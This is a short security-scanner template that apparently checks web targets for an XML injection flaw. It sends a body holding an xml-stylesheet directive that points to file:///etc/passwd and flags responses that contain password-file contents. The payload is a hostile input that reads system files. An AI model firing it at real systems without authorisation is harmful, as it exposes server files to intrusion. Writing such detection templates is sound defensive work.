id: xxe-083
name: 'XXE via body'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via body'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      body:
        - '<?xml-stylesheet type="text/xsl" href="file:///etc/passwd"?>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'XXE_OK'
